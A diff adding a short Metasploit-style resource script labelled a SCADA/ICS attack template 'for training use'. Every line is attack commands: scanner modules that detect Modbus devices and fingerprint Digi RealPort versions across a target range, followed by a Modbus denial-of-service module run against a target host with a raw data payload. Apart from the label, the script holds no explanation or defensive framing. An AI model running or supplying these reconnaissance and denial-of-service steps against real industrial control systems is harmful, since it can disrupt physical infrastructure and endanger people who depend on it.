@@ -1,0 +1,17 @@
+# SCADA/ICS Attack Template
+# For Training Use – Non-functional Template
+
+use auxiliary/scanner/scada/modbusdetect
+set RHOSTS <TARGET_RANGE>
+set RPORT 502
+run
+
+use auxiliary/scanner/scada/digi_realport_version
+set RHOSTS <TARGET_RANGE>
+run
+
+use auxiliary/dos/scada/modbus_stager
+set RHOST <TARGET_IP>
+set RPORT 502
+set DATA 0x01,0x03,0x00,0x00,0x00,0x01
+run
